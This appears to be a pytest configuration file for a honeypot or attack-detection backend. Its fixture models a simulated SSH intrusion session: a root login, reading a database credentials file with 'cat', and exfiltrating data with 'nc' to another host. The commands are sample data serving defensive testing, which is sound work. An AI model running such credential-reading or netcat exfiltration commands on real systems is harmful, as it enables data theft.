import os
import sys

import pytest


BACKEND_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if BACKEND_DIR not in sys.path:
    sys.path.insert(0, BACKEND_DIR)

# Use the test database for API integration tests.
os.environ.setdefault(
    "DATABASE_URL",
    "postgresql+psycopg://sentinel:sentinel_dev_2026@localhost:5432/sentineltrap_test",
)
os.environ.setdefault("SECRET_KEY", "test_secret_key")


@pytest.fixture(scope="session")
def db_url():
    return os.environ["DATABASE_URL"]


@pytest.fixture()
def sample_session_events():
    """A canonical list of NormalizedEvents forming a multi-stage SSH session."""
    from datetime import datetime, timedelta
    from app.schemas.event import NormalizedEvent

    t0 = datetime(2026, 1, 1, 10, 0, 0)
    events = [
        NormalizedEvent(
            event_id="e1", timestamp=t0 + timedelta(seconds=1), session_id="S1",
            source="10.0.0.5", service="ssh", event_type="connection", action="connect",
        ),
        NormalizedEvent(
            event_id="e2", timestamp=t0 + timedelta(seconds=2), session_id="S1",
            source="10.0.0.5", service="ssh", event_type="authentication_failure",
            action="authentication", username="root", result="failure",
        ),
        NormalizedEvent(
            event_id="e3", timestamp=t0 + timedelta(seconds=3), session_id="S1",
            source="10.0.0.5", service="ssh", event_type="authentication_success",
            action="authentication", username="root", result="success",
        ),
        NormalizedEvent(
            event_id="e4", timestamp=t0 + timedelta(seconds=4), session_id="S1",
            source="10.0.0.5", service="ssh", event_type="command",
            action="system_discovery", command="uname -a",
        ),
        NormalizedEvent(
            event_id="e5", timestamp=t0 + timedelta(seconds=5), session_id="S1",
            source="10.0.0.5", service="ssh", event_type="command",
            action="file_read", command="cat /opt/db/db_credentials.conf",
            target="db_credentials.conf",
        ),
        NormalizedEvent(
            event_id="e6", timestamp=t0 + timedelta(seconds=6), session_id="S1",
            source="10.0.0.5", service="ssh", event_type="command",
            action="network_exfil", command="nc 10.0.0.9 4444",
        ),
        NormalizedEvent(
            event_id="e7", timestamp=t0 + timedelta(seconds=8), session_id="S1",
            source="10.0.0.5", service="ssh", event_type="session_end", action="close",
        ),
    ]
    return events
